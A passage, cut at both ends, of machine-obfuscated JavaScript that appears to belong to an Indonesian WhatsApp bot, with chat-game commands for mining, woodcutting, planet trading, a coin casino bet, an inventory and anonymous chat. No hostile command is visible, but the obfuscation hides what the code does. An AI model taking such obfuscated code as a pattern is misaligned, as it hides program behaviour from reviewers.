_0x345045(_0x5522cc,_0x3b858a,_0x567019,_0x338917,_0x5df171,_0xdd426c);},'ucuBc':_0x5768fc(0x30c,0x370,0x2ed,0x3c2)},_0x571a75=Math[_0x5768fc(0x2ba,0x3bc,0x2fe,0x389)](_0x1c54c4[_0x5768fc(0x39d,0x398,0x328,0x373)](Math[_0x4be990(-0xe4,-0x216,-0x181,-0x14f)](),-0x43*-0x3b+0x11fa+-0x687*0x5)),_0x270693=Math[_0x4be990(-0x1c4,-0x128,-0x16e,-0x166)](_0x1c54c4[_0x4be990(-0x7c,-0x214,-0x1e5,-0x13c)](Math['random'](),0x8b5*0x1+0x74b*0x1+0x7f6*-0x2));function _0x5768fc(_0x1283ce,_0x520a60,_0x361d33,_0x4e115f){return _0x2b5443(_0x1283ce-0x12c,_0x361d33- -0x1d8,_0x361d33-0x166,_0x520a60);}_0x1c54c4[_0x5768fc(0x254,0x293,0x255,0x21c)](addStone,sender,_0x571a75);function _0x4be990(_0x3fc0f3,_0x5233ad,_0x152222,_0x356f49){return _0x2b5443(_0x3fc0f3-0x8d,_0x356f49- -0x63c,_0x152222-0x129,_0x152222);}_0x1c54c4[_0x5768fc(0x1c1,0x193,0x255,0x25f)](addKayu,sender,_0x270693);const _0x4ff6f9={};_0x4ff6f9[_0x5768fc(0x321,0x2f0,0x2f6,0x37a)+'t']=_0x4be990(-0x1a8,-0x1dd,-0x1e7,-0x147)+'ry\x20🗃️';const _0x1e8ed6={};_0x1e8ed6['quoted']=mek,_0x1c54c4['fXRaV'](sendButImage,from,'*Congratul'+_0x4be990(-0x164,-0x16b,-0x265,-0x1af)+enter+enter+(_0x5768fc(0x1a2,0x1f9,0x278,0x2b0)+_0x5768fc(0x30e,0x375,0x2a2,0x366))+_0x571a75+('*\x20batu\x20dan'+'\x20')+_0x270693+_0x4be990(-0x1f9,-0x21d,-0x256,-0x19f)+enter+enter+(_0x4be990(-0x240,-0xc1,-0x1e8,-0x17f)+_0x5768fc(0x1a4,0x276,0x1f6,0x128)+_0x4be990(-0x168,-0xd2,-0xaa,-0x106)+_0x5768fc(0x281,0x35b,0x32c,0x3b4))+prefix+_0x5768fc(0x1d7,0x1c3,0x25a,0x1b8),botname+'™©\x20|\x20By\x20'+ownername,bbbb,[{'buttonId':_0x5768fc(0x1ad,0x2d9,0x211,0x250),'buttonText':_0x4ff6f9,'type':_0x1c54c4[_0x4be990(-0x29c,-0x34a,-0x285,-0x27b)]}],_0x1e8ed6);},0x1c1+-0x5c4*-0x3+-0x755),setTimeout(()=>{const _0x4f7fb2={'mrBSH':function(_0x40db4b,_0x468abe){return _0x40db4b(_0x468abe);},'EoNdr':_0x2f67f1(-0x128,-0x210,-0x1ca,-0x128)+_0x1ec04e(0x2c2,0x385,0x1ff,0x266)+'\x20silahkan\x20'+_0x1ec04e(0x38f,0x2f4,0x322,0x426)};function _0x2f67f1(_0x361736,_0x8f6239,_0x25b5cd,_0x22d4ff){return _0x2b5443(_0x361736-0x13b,_0x25b5cd- -0x654,_0x25b5cd-0x99,_0x8f6239);}function _0x1ec04e(_0x3faad2,_0xcbc98,_0x39decc,_0x2d971e){return _0x2b5443(_0x3faad2-0x1f,_0x3faad2- -0x101,_0x39decc-0x19d,_0x2d971e);}_0x4f7fb2[_0x1ec04e(0x3a1,0x3f7,0x3ce,0x2c8)](reply,_0x4f7fb2[_0x1ec04e(0x39d,0x3eb,0x39b,0x444)]);},-0x151e+-0x1659+-0x3*-0xe7d);}else{const _0x1b2208={};_0x1b2208['method']=_0x5c83b7(0x395,0x376,0x3c4,0x40c),seae=await getBuffer(_0x2b5443(0x3c1,0x3e6,0x42b,0x441)+'legra.ph/f'+_0x2b5443(0x428,0x3c7,0x3ac,0x317)+_0x5c83b7(0x402,0x2b1,0x32a,0x3e6)+_0x5c83b7(0x3bf,0x34c,0x378,0x3d8),_0x1b2208),tesk=_0x5c83b7(0x466,0x4eb,0x41b,0x3fe)+'AYAH\x20YANG\x20'+_0x5c83b7(0x3ba,0x3d9,0x363,0x404)+_0x2b5443(0x4c2,0x43a,0x442,0x504)+'\x0a\x0a\x0a⚪\x20Corbi'+_0x2b5443(0x5db,0x508,0x52c,0x54a)+_0x5c83b7(0x2bb,0x428,0x34d,0x289)+_0x5c83b7(0x34d,0x225,0x2f6,0x32b)+_0x5c83b7(0x412,0x504,0x446,0x3d8)+'land\x0a🟣\x20Ger'+_0x2b5443(0x536,0x52a,0x5ef,0x556)+_0x5c83b7(0x34a,0x310,0x2d7,0x29f)+_0x5c83b7(0x487,0x38e,0x3ac,0x46d)+'imingstall'+_0x5c83b7(0x374,0x407,0x39f,0x390)+_0x2b5443(0x3eb,0x3f2,0x433,0x49f)+_0x2b5443(0x407,0x42e,0x355,0x442)+_0x5c83b7(0x378,0x434,0x445,0x37b)+'\x20'+prefix+('jelajah\x20co'+'rbiens\x20riv'+_0x2b5443(0x4be,0x482,0x3f5,0x4c3)+'\x20Nama\x20temp'+'at\x20\x20_https'+_0x2b5443(0x47e,0x517,0x5b0,0x4f0)+_0x5c83b7(0x3fa,0x3dc,0x3fb,0x3fb)+_0x2b5443(0x52d,0x54a,0x4fe,0x552)+_0x5c83b7(0x3bd,0x36e,0x2f7,0x2a3)),alpha[_0x2b5443(0x3ae,0x433,0x40c,0x442)+'e'](from,seae,image,{'thumbnail':seae,'quoted':mek,'caption':tesk});}}}}}}}break;case'nambang':if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x2b5443(0x51d,0x44e,0x4d2,0x51d)+_0x5c83b7(0x4e3,0x3bc,0x44e,0x40f)+_0x5c83b7(0x384,0x4b4,0x448,0x3ab)+'n\x20kirim\x20'+prefix+('limit\x20untu'+'k\x20mengecek'+'\x20limit'));if(!isEventon)return reply('Event\x20grub'+_0x2b5443(0x35b,0x40e,0x4c5,0x497)+'aktifkan');setTimeout(()=>{const _0x2913aa={'rVjoD':function(_0x1eb248,_0x155c69){return _0x1eb248*_0x155c69;},'yNlLt':function(_0x289be9,_0x5931dc){return _0x289be9*_0x5931dc;},'weMwx':function(_0x41fe74,_0x3bcf74,_0x12ff55){return _0x41fe74(_0x3bcf74,_0x12ff55);},'sSOcc':function(_0x2aa28c,_0x54980f,_0xa147f8){return _0x2aa28c(_0x54980f,_0xa147f8);},'RQKAZ':function(_0x14f8f9,_0x3c71bf){return _0x14f8f9(_0x3c71bf);}},_0x4bba90=Math[_0x36b2a1(0x138,0xd7,0x1ac,0x207)](_0x2913aa['rVjoD'](Math['random'](),-0x1*0x19e4+0xa4+0x19a4)),_0x3f636e=Math['ceil'](Math[_0x3e0520(0x2d1,0x26b,0x2d8,0x24a)]()*(0x1793+-0x2474+-0x3*-0x455)),_0x3cb6ab=Math[_0x36b2a1(0x138,0xc1,0x78,0x183)](_0x2913aa[_0x3e0520(0x394,0x366,0x2f0,0x24d)](Math[_0x3e0520(0x203,0x381,0x2d8,0x329)](),0x234b+-0x3*-0x611+0x1*-0x3574));_0x2913aa[_0x3e0520(0x16c,0x1c5,0x1f4,0x24b)](addStone,sender,_0x4bba90),_0x2913aa[_0x36b2a1(0x6b,0x17,-0x64,-0x39)](addCoal,sender,_0x3f636e);function _0x36b2a1(_0x5c9322,_0x4d413b,_0xe27644,_0x3a12ba){return _0x2b5443(_0x5c9322-0x82,_0x5c9322- -0x39e,_0xe27644-0x9c,_0x4d413b);}function _0x3e0520(_0x2e8b4e,_0x419473,_0x57898e,_0x52d110){return _0x5c83b7(_0x2e8b4e-0x123,_0x419473-0x137,_0x57898e- -0x10f,_0x2e8b4e);}_0x2913aa[_0x36b2a1(0x106,0x3b,0x17a,0x7b)](addOre,sender,_0x3cb6ab),_0x2913aa['RQKAZ'](reply,_0x3e0520(0x35b,0x253,0x2c2,0x2b2)+'ation\x20🎊*'+enter+enter+(_0x36b2a1(0xa0,0x9b,0xf5,0xb1)+_0x3e0520(0x270,0x1f6,0x1ab,0x1f4))+_0x4bba90+_0x3e0520(0x200,0x24c,0x1c9,0x241)+_0x3f636e+(_0x3e0520(0x242,0x1f7,0x221,0x262)+'an\x20*')+_0x3cb6ab+_0x36b2a1(0xca,0xd0,0x125,0x55));},-0xfb*0xb+-0xc28+0x22a9*0x1),setTimeout(()=>{function _0x1312d2(_0x46eff9,_0x1908a,_0x1f9b5a,_0x206340){return _0x2b5443(_0x46eff9-0x19d,_0x46eff9- -0x5ec,_0x1f9b5a-0x157,_0x1908a);}function _0x1133e7(_0x5ecbae,_0xada08a,_0x1cc413,_0x2e9fcb){return _0x5c83b7(_0x5ecbae-0x11f,_0xada08a-0xfd,_0xada08a- -0x534,_0x5ecbae);}const _0x21a455={'IUjzD':function(_0x22f4b3,_0x49831c){return _0x22f4b3(_0x49831c);},'hwIbB':_0x1312d2(-0x1b5,-0x195,-0x212,-0x25f)+'ambang,\x20si'+'lahkan\x20tun'+_0x1312d2(-0x10b,-0x159,-0x1d5,-0xb1)};_0x21a455['IUjzD'](reply,_0x21a455[_0x1312d2(-0x99,-0x11,-0x16f,-0x121)]);},0x4ed+0xc7*-0x2d+-0x1e0e*-0x1);break;case _0x2b5443(0x3e4,0x3dc,0x3ec,0x355):if(!isEventon)return reply('ya\x20maap\x20aj'+_0x2b5443(0x40a,0x410,0x40c,0x4c7)+_0x5c83b7(0x354,0x332,0x3e2,0x448)+_0x5c83b7(0x34d,0x3f3,0x3d5,0x3b3)+_0x5c83b7(0x338,0x322,0x2aa,0x2cb));setTimeout(()=>{function _0x58bce8(_0x5d735e,_0x1bb147,_0xaa51ef,_0x315597){return _0x5c83b7(_0x5d735e-0x190,_0x1bb147-0x64,_0x5d735e-0xee,_0x315597);}const _0x2d9add={'aHuth':function(_0x2732ef,_0x2d322c){return _0x2732ef*_0x2d322c;},'ZNjcS':function(_0x4262e9,_0x34bea7,_0x2785f1){return _0x4262e9(_0x34bea7,_0x2785f1);},'ehNlZ':function(_0x206719,_0x48b9d7){return _0x206719(_0x48b9d7);}},_0x28fcc4=Math[_0x58bce8(0x4be,0x4ab,0x53c,0x3fe)](_0x2d9add[_0x58bce8(0x3d2,0x33b,0x326,0x310)](Math[_0x58bce8(0x4d5,0x531,0x470,0x53a)](),0x11*-0x245+-0x1*-0x1ad5+-0x5ea*-0x2));function _0x5240b4(_0x3553ba,_0x22d913,_0xca5eb7,_0x1aec1d){return _0x2b5443(_0x3553ba-0x49,_0x3553ba- -0x627,_0xca5eb7-0xa,_0x22d913);}_0x2d9add['ZNjcS'](addKayu,sender,_0x28fcc4),_0x2d9add[_0x5240b4(-0x23f,-0x2e8,-0x2ec,-0x317)](reply,_0x5240b4(-0x150,-0xa4,-0x196,-0x14d)+_0x5240b4(-0x19a,-0x143,-0x234,-0xce)+enter+enter+(_0x58bce8(0x530,0x574,0x469,0x55b)+_0x5240b4(-0x1ad,-0x27b,-0x105,-0x123))+_0x28fcc4+(_0x58bce8(0x442,0x4cc,0x40f,0x499)+_0x5240b4(-0x148,-0x1b2,-0x102,-0x1f7)));},-0x577*-0x1+-0x1*-0x10b+0x2*0x29b),setTimeout(()=>{const _0x3b9d25={'euCZw':function(_0x119094,_0x15b2ad){return _0x119094(_0x15b2ad);},'etlgM':_0x46015a(0x4dd,0x435,0x4d2,0x3fe)+_0x46015a(0x3f8,0x453,0x393,0x380)+_0x117d34(0x36a,0x3f8,0x39e,0x3f7)+'ggu...'};function _0x117d34(_0x423870,_0x22aae8,_0x2d3680,_0x3a28d4){return _0x2b5443(_0x423870-0x2d,_0x3a28d4- -0xe9,_0x2d3680-0xed,_0x2d3680);}function _0x46015a(_0x2fd1b8,_0x1cd199,_0x1e1254,_0x51da97){return _0x2b5443(_0x2fd1b8-0x6d,_0x1cd199- -0x2,_0x1e1254-0x6b,_0x2fd1b8);}_0x3b9d25[_0x46015a(0x32c,0x3d5,0x349,0x41c)](reply,_0x3b9d25[_0x117d34(0x3ae,0x381,0x41b,0x422)]);},-0x254f+-0x2393*-0x1+0x1bc);break;case _0x2b5443(0x49b,0x537,0x5cd,0x462):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x5c83b7(0x305,0x2d0,0x348,0x3a2)+'\x20sudah\x20hab'+_0x2b5443(0x582,0x54e,0x5d7,0x603)+_0x5c83b7(0x2e2,0x243,0x29b,0x35c)+prefix+(_0x2b5443(0x370,0x3a4,0x325,0x403)+_0x2b5443(0x54b,0x4a6,0x403,0x53d)+_0x5c83b7(0x355,0x4da,0x428,0x4f0)));if(!isEventon)return reply(_0x5c83b7(0x359,0x2a4,0x370,0x3ed)+_0x5c83b7(0x288,0x2b8,0x308,0x30c)+_0x5c83b7(0x2bd,0x3c1,0x37f,0x448));setTimeout(()=>{const _0x924130={'prGQT':_0x388a20(-0x9d,0x37,0xe,-0x42),'yKRAq':_0x54379c(0x51d,0x48f,0x4bc,0x559),'NtRPi':_0x54379c(0x412,0x467,0x359,0x4d5),'sUpVa':'jupiter','ttKqd':function(_0x1398cd,_0xc4c63a){return _0x1398cd*_0xc4c63a;},'Slkwl':function(_0x1fabcb,_0x4b41a2,_0x3f9d9b){return _0x1fabcb(_0x4b41a2,_0x3f9d9b);},'affpu':function(_0x52492e,_0x3dfade){return _0x52492e(_0x3dfade);}},_0x3d3804=Math[_0x388a20(-0x86,0x47,-0xf0,-0x106)](Math[_0x54379c(0x536,0x462,0x5bc,0x58f)]()*(0x179f+0x9*-0x3b4+-0x2f*-0x37)),_0x225bfa=[_0x924130[_0x388a20(-0xdd,-0x10d,-0x1a8,-0xe8)],_0x924130[_0x388a20(-0x69,0x16,0x51,-0x2)],_0x924130['NtRPi'],_0x924130[_0x388a20(-0x18f,-0x220,-0x244,-0x11e)],_0x388a20(-0x127,-0x162,-0x1da,-0xb1),_0x54379c(0x53f,0x4af,0x4c3,0x468),_0x54379c(0x441,0x3e6,0x44f,0x4f8)],_0x55f4f3=_0x225bfa[Math[_0x54379c(0x4d4,0x434,0x404,0x4d1)](_0x924130['ttKqd'](Math['random'](),_0x225bfa[_0x54379c(0x4b5,0x488,0x519,0x404)]))];_0x924130[_0x54379c(0x48c,0x53a,0x3ce,0x3d6)](addPlanet,sender,_0x3d3804);function _0x388a20(_0x1f16e7,_0x21e129,_0x45ebb1,_0x14377a){return _0x2b5443(_0x1f16e7-0x15e,_0x1f16e7- -0x55c,_0x45ebb1-0x12e,_0x45ebb1);}function _0x54379c(_0x453690,_0x559bd7,_0x188d3e,_0x10a799){return _0x2b5443(_0x453690-0x1d1,_0x453690-0x49,_0x188d3e-0xdc,_0x559bd7);}_0x924130['affpu'](reply,_0x54379c(0x520,0x464,0x57c,0x542)+'ation\x20🎊*'+enter+enter+(_0x388a20(-0x14,-0x2b,0x77,0x68)+'patkan\x20*')+_0x3d3804+(_0x54379c(0x47d,0x4e9,0x41d,0x494)+_0x388a20(-0xc6,-0x64,0x11,-0xdd))+_0x55f4f3+(_0x54379c(0x475,0x47c,0x3be,0x4c5)+_0x54379c(0x57c,0x600,0x648,0x5ee)));},0xb5a+-0x7*-0xb2+-0x480),setTimeout(()=>{function _0x38e8fa(_0x315111,_0xfb368,_0x5ec280,_0x3d7c3b){return _0x5c83b7(_0x315111-0x6,_0xfb368-0x68,_0xfb368- -0x271,_0x3d7c3b);}const _0x2f4e8b={'xPAPT':function(_0x27d86c,_0x3b8b4d){return _0x27d86c(_0x3b8b4d);}};function _0x155bbd(_0x572306,_0x5058e1,_0x188cdf,_0x55d46a){return _0x2b5443(_0x572306-0xf6,_0x5058e1- -0x250,_0x188cdf-0x1c6,_0x188cdf);}_0x2f4e8b[_0x38e8fa(0x6d,0x134,0x200,0x107)](reply,_0x38e8fa(0x5c,0x113,0x103,0x91)+_0x155bbd(0x23f,0x2b2,0x2e7,0x26f)+_0x155bbd(0x22e,0x19d,0x1a8,0x148)+_0x155bbd(0x274,0x22d,0x234,0x20e)+_0x38e8fa(0x25,0x64,0x10e,0x110));},-0x57d+-0x16a*-0x17+0x301*-0x9);break;case _0x2b5443(0x537,0x51c,0x4e7,0x4ab)+_0x5c83b7(0x3a2,0x49a,0x403,0x48a):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x5c83b7(0x405,0x27f,0x348,0x271)+'\x20sudah\x20hab'+_0x5c83b7(0x43e,0x3fe,0x448,0x3b7)+'n\x20kirim\x20'+prefix+(_0x5c83b7(0x23c,0x308,0x29e,0x302)+'k\x20mengecek'+_0x5c83b7(0x3b8,0x4f6,0x428,0x49a)));if(!isEventon)return reply(_0x5c83b7(0x40b,0x38c,0x370,0x424)+_0x5c83b7(0x2b4,0x25e,0x308,0x243)+_0x2b5443(0x3c9,0x485,0x40b,0x422));buayar=body['slice'](-0x1c1*0x13+0x637+-0x6cb*-0x4);const hargakimia=-0x1ac6+-0x1bc8+0x7*0x85a,dapetin=buayar*hargakimia;if(getBertualangPlanet(sender)<=0x5f*0x20+0x4*-0x6a6+-0xeb9*-0x1)return reply(_0x2b5443(0x493,0x4fc,0x4a4,0x53d)+pushname+(_0x5c83b7(0x2eb,0x25d,0x311,0x2bf)+_0x5c83b7(0x239,0x1ea,0x2b9,0x37d)+_0x5c83b7(0x342,0x348,0x367,0x393)));getBertualangPlanet(sender)>=-0x439*-0x1+0x1*-0x15e+-0x92*0x5&&(jualbahankimia(sender,buayar),addKoinUser(sender,dapetin),await reply(_0x2b5443(0x366,0x3a7,0x481,0x2da)+_0x2b5443(0x4eb,0x43f,0x382,0x39f)+'L\x20」*'+enter+enter+(_0x5c83b7(0x390,0x3e3,0x44c,0x46e)+_0x5c83b7(0x22b,0x35e,0x2a5,0x2ed)+_0x5c83b7(0x447,0x49e,0x412,0x4d0))+buayar+enter+(_0x5c83b7(0x470,0x3fb,0x3a6,0x303)+'pat:*\x20')+dapetin+enter+enter+('*Sisa\x20baha'+'nkimia:*\x20')+getBertualangPlanet(sender)+enter+(_0x2b5443(0x444,0x4cc,0x476,0x541)+_0x2b5443(0x476,0x411,0x353,0x4a9))+checkATMuser(sender)+enter+enter+(_0x2b5443(0x4a8,0x53a,0x569,0x4c0)+'berhasil\x20d'+_0x5c83b7(0x3a5,0x275,0x305,0x271)+'r\x20pembayar'+_0x5c83b7(0x28b,0x23a,0x2fe,0x243)+'ak1920kal')));break;case _0x2b5443(0x55a,0x4ef,0x4e6,0x576)+_0x5c83b7(0x36b,0x352,0x403,0x494):teks=_0x5c83b7(0x3ba,0x44e,0x44c,0x3ff)+_0x2b5443(0x4ed,0x466,0x4b7,0x3b9)+_0x2b5443(0x3b1,0x402,0x4b7,0x4a1)+_0x2b5443(0x48f,0x4d9,0x4ef,0x484)+pushname+(_0x5c83b7(0x397,0x3e3,0x421,0x379)+_0x2b5443(0x4c1,0x4f0,0x585,0x495))+getBertualangPlanet(sender)+'_*';const _0x4bb355={};_0x4bb355[_0x5c83b7(0x3d7,0x2e5,0x323,0x27e)]=mek,alpha['sendMessag'+'e'](from,teks,text,_0x4bb355);break;case _0x2b5443(0x382,0x3f0,0x466,0x3c7):case _0x5c83b7(0x3d5,0x3fb,0x392,0x341):if(isLimit(sender,isPremium,isCreator,isOwner,limitawal,limit))return reply(_0x5c83b7(0x3d8,0x2ce,0x348,0x2ce)+_0x5c83b7(0x491,0x3d7,0x44e,0x428)+'is\x20silahka'+_0x5c83b7(0x25e,0x31f,0x29b,0x320)+prefix+(_0x5c83b7(0x339,0x348,0x29e,0x358)+_0x2b5443(0x4ec,0x4a6,0x4ec,0x541)+_0x2b5443(0x47d,0x52e,0x5df,0x522)));if(!isEventon)return reply(_0x5c83b7(0x443,0x2c1,0x370,0x2ed)+_0x5c83b7(0x2c0,0x3e1,0x308,0x28c)+_0x5c83b7(0x3b7,0x32a,0x37f,0x378));cas=body[_0x5c83b7(0x2a8,0x2b4,0x2d9,0x2f0)](-0x1b*-0x2b+0x1*-0x6db+0x258);if(checkATMuser(sender)<cas)return reply(_0x2b5443(0x473,0x40f,0x3c2,0x4cd)+_0x2b5443(0x4e5,0x475,0x438,0x3ed)+_0x5c83b7(0x33d,0x379,0x3a8,0x3ef)+'melakukan\x20'+_0x5c83b7(0x390,0x31d,0x2ea,0x3ab));if(args[_0x2b5443(0x4fb,0x46c,0x3c5,0x493)]<0x8a*0x27+0x126f+0xca*-0x32)return reply(_0x2b5443(0x56e,0x52f,0x554,0x473)+'n\x20berapa');if(isNaN(cas))return reply('Mua\x20taruha'+'n\x20berapa?');const resg=[_0x2b5443(0x46c,0x487,0x53b,0x51e)+_0x2b5443(0x490,0x426,0x4bf,0x42a),'Kamu\x20KALAH'+'!!'];bayar=confirmATM(sender,cas),setTimeout(()=>{const _0x5d78b7={'wfTtO':function(_0x1d2fa1,_0x3fd1d2){return _0x1d2fa1*_0x3fd1d2;},'acFeD':function(_0x375028,_0x5b286d){return _0x375028+_0x5b286d;},'JWBsX':function(_0x309e61,_0x1ae1e8){return _0x309e61==_0x1ae1e8;},'AZTgs':_0x29bd90(0x46,0x131,0x1c6,0xed)+'G!!','Ydumn':_0x4d9133(-0x2e0,-0x1b4,-0x231,-0x158)+'!!','NaKnz':function(_0x2c830e,_0x4dcd7a,_0x23cb57){return _0x2c830e(_0x4dcd7a,_0x23cb57);},'XrLOF':function(_0x43d0f9,_0x37edb5){return _0x43d0f9(_0x37edb5);},'oxQPI':function(_0x2500bc,_0x5a7ab1){return _0x2500bc(_0x5a7ab1);},'sDsiM':_0x4d9133(-0xbe,-0xb9,-0xc9,-0x117)},_0x5b5a08=Math['ceil'](_0x5d78b7[_0x29bd90(0x1dc,0x9e,0x1d5,0x14b)](Math[_0x29bd90(0x19e,0xcb,0x200,0x153)](),-0xb52+-0x4e8+0x103c));function _0x29bd90(_0x1e2ff4,_0x1d6574,_0x4b6e89,_0x34c88e){return _0x5c83b7(_0x1e2ff4-0x150,_0x1d6574-0x1e6,_0x34c88e- -0x294,_0x4b6e89);}function _0x4d9133(_0x5d9b4e,_0x4d736a,_0x28a23e,_0x55d360){return _0x2b5443(_0x5d9b4e-0x115,_0x28a23e- -0x5d7,_0x28a23e-0x109,_0x55d360);}const _0x197707=_0x5d78b7['acFeD'](cas,-0x2018+-0x1327+-0x333f*-0x1),_0x38a4ee=resg[Math[_0x29bd90(0x1a8,0x194,0xff,0xf1)](_0x5d78b7['wfTtO'](Math[_0x29bd90(0x1e3,0x1fc,0x1a2,0x153)](),resg['length']))];if(_0x5d78b7['JWBsX'](_0x38a4ee,_0x5d78b7[_0x29bd90(-0x79,-0x79,0xaf,0x18)]))addKoinUser(sender,_0x197707),reply(_0x4d9133(-0xee,-0xee,-0x100,-0x19e)+_0x29bd90(0x87,0xbd,0x6c,0xf3)+enter+enter+('Kamu\x20memen'+'angkan\x20cas'+_0x29bd90(0x168,0x1ee,0x1eb,0x179)+'r\x20*_')+_0x197707+'_*'+enter+enter+('Kumpulkan\x20'+_0x4d9133(-0x8f,-0x15d,-0x123,-0x185)+'\x20membeli\x20l'+'imit'));else _0x38a4ee==_0x5d78b7[_0x4d9133(-0xa8,-0x12f,-0x94,-0xa7)]?(_0x5d78b7[_0x4d9133(-0x2b7,-0x224,-0x22a,-0x27f)](confirmATM,sender,cas),_0x5d78b7[_0x4d9133(-0x106,-0x1d2,-0x19e,-0x159)](reply,_0x29bd90(0xf9,0xfa,0xed,0x31)+_0x29bd90(0xf8,0x162,0xf1,0x192)+_0x29bd90(0x148,0x1c2,0x1ef,0x170)+'ng\x20sebesar'+'\x20'+cas)):_0x5d78b7[_0x4d9133(-0xd1,-0x54,-0xbd,-0x127)](reply,_0x5d78b7['sDsiM']);},0x2*0x74+0x1b6d+-0x109d),setTimeout(()=>{function _0x1751a7(_0x5a72ee,_0x32664e,_0x2248f2,_0x4deda0){return _0x5c83b7(_0x5a72ee-0xad,_0x32664e-0xc2,_0x2248f2- -0x3e,_0x4deda0);}function _0x408427(_0x3d4da0,_0x10895b,_0x21b1bf,_0x51fade){return _0x5c83b7(_0x3d4da0-0x11d,_0x10895b-0x1db,_0x10895b- -0x2f3,_0x3d4da0);}const _0x1b4b3f={'NqemC':function(_0x43087f,_0x596037){return _0x43087f(_0x596037);}};_0x1b4b3f[_0x1751a7(0x2cd,0x2b6,0x366,0x327)](reply,_0x1751a7(0x389,0x30d,0x3a3,0x2ff)+_0x408427(-0x48,-0x20,0x75,-0xe5));},-0x1b0c+0x1865*-0x1+-0xd*-0x3f5),await limitAdd(sender,limit);break;case'inv':case _0x2b5443(0x3c9,0x41e,0x3a3,0x482):case _0x5c83b7(0x280,0x351,0x32c,0x328):inventory=_0x2b5443(0x3d7,0x493,0x4fe,0x4c2)+_0x5c83b7(0x3e8,0x42c,0x372,0x419)+'🗃️\x20\x0a\x0a🎢\x20*COA'+_0x5c83b7(0x449,0x363,0x3a9,0x482)+getMiningcoal(sender)+(_0x2b5443(0x5a9,0x4ec,0x4ae,0x5bc)+_0x2b5443(0x500,0x488,0x434,0x4fd))+getMiningstone(sender)+('\x0a❄️\x20*COPPER'+_0x2b5443(0x517,0x4b0,0x40f,0x50e))+getMiningore(sender)+('\x0a🛠️\x20*INGOT\x20'+'ORE*\x20:\x20')+getMiningingot(sender)+(_0x2b5443(0x52b,0x4c1,0x4b5,0x51d)+':\x20')+getNebangKayu(sender)+(_0x5c83b7(0x376,0x33b,0x2b6,0x2a4)+':\x20')+getMancingIkan(sender)+(_0x2b5443(0x55b,0x4cf,0x522,0x53b)+_0x2b5443(0x3e2,0x477,0x4fb,0x513)+_0x5c83b7(0x40a,0x34b,0x3bd,0x3b3)+_0x2b5443(0x530,0x4e9,0x4a5,0x410)+_0x2b5443(0x529,0x483,0x4d6,0x55d)+_0x2b5443(0x3c8,0x3c5,0x47d,0x44f)+_0x5c83b7(0x2d2,0x395,0x335,0x31c)),alpha['sendMessag'+'e'](from,pp_userz,image,{'thumbnail':Buffer['alloc'](0x533+-0x1d30+0x17fd),'quoted':mek,'caption':inventory});break;case _0x5c83b7(0x344,0x23d,0x2af,0x325):{const flamingtext=_0x5c83b7(0x422,0x41f,0x42a,0x3e8)+'w6.flaming'+_0x5c83b7(0x425,0x2e0,0x39b,0x467)+_0x5c83b7(0x2e0,0x2e7,0x376,0x423)+_0x2b5443(0x390,0x456,0x486,0x483)+_0x2b5443(0x3d6,0x46e,0x530,0x50e)+_0x5c83b7(0x3e2,0x3f6,0x345,0x2e4)+_0x2b5443(0x44f,0x4fa,0x441,0x54c)+_0x2b5443(0x495,0x3e0,0x4a0,0x40f)+'Scale=true'+_0x2b5443(0x3e0,0x3d4,0x49d,0x48e)+_0x5c83b7(0x1fc,0x275,0x2ab,0x261)+_0x2b5443(0x4d5,0x519,0x509,0x488)+_0x5c83b7(0x344,0x29c,0x365,0x35c)+_0x5c83b7(0x377,0x3ac,0x433,0x4fe)+_0x5c83b7(0x27f,0x379,0x321,0x3f4)+_0x5c83b7(0x3db,0x35a,0x38b,0x2b4)+_0x2b5443(0x41f,0x448,0x489,0x4f2)+'ing!&text=';if(isGroup)return reply('Only\x20priva'+_0x2b5443(0x473,0x44f,0x3fd,0x3ee));this['anonymous']=this[_0x2b5443(0x38f,0x3b5,0x30f,0x451)]?this[_0x2b5443(0x317,0x3b5,0x467,0x3ed)]:{},anonymousloc=await getBuffer(flamingtext+(_0x2b5443(0x51d,0x46a,0x42b,0x46a)+'Chat'));const _0x597551={};_0x597551[_0x2b5443(0x54a,0x4ce,0x460,0x4e3)+'t']=_0x5c83b7(0x4a1,0x39c,0x3f3,0x44a);const _0x3016dc={};_0x3016dc[_0x2b5443(0x2f9,0x3b9,0x339,0x426)]='menu',_0x3016dc[_0x5c83b7(0x316,0x31c,0x336,0x32a)]=_0x597551,_0x3016dc[_0x5c83b7(0x275,0x3aa,0x31d,0x340)]=0x1;const _0x52af5d={};_0x52af5d[_0x5c83b7(0x3b0,0x385,0x3c8,0x411)+'t']=_0x5c83b7(0x2ff,0x381,0x3c1,0x334);const _0x114259={};_0x114259[_0x5c83b7(0x364,0x35c,0x2b3,0x23b)]=_0x5c83b7(0x294,0x339,0x369,0x3d6),_0x114259[_0x2b5443(0x3dc,0x43c,0x4ef,0x4c8)]=_0x52af5d,_0x114259[_0x2b5443(0x4fb,0x423,0x4dd,0x38e)]=0x1;const _0x4330c4={};_0x4330c4[_0x5c83b7(0x2e6,0x33e,0x323,0x31a)]=mek,sendButLocation(from,_0x5c83b7(0x408,0x36a,0x3b8,0x346)+'\x20Anonymous'+_0x2b5443(0x531,0x4a0,0x555,0x428)+prefix+(_0x5c83b7(0x242,0x299,0x2e1,0x3a4)+_0x5c83b7(0x4b3,0x3d2,0x43e,0x365)+'er\x0a')+prefix+(_0x5c83b7(0x412,0x44d,0x396,0x2bc)+_0x2b5443(0x5f4,0x53d,0x5c7,0x555))+prefix+(_0x5c83b7(0x296,0x251,0x301,0x319)+_0x5c83b7(0x436,0x3da,0x3d2,0x349)+'r'),_0x5c83b7(0x318,0x2a6,0x2b7,0x29f)+'t\x20'+botname+_0x2b5443(0x476,0x449,0x50f,0x452),anonymousloc,[_0x3016dc,_0x114259],_0x4330c4);}break;case _0x2b5443(0x3a3,0x420,0x485,0x350):case _0x5c83b7(0x3f9,0x3bd,0x391,0x40f):{if(isGroup)return reply(_0x5c83b7(0x3a3,0x35a,0x3be,0x334)+_0x5c83b7(0x2ba,0x311,0x349,0x35c));this[_0x2b5443(0x34e,0x3b5,0x302,0x406)]=this[_0x2b5443(0x30e,0x3b5,0x359,0x41e)]?this['anonymous']:{};let 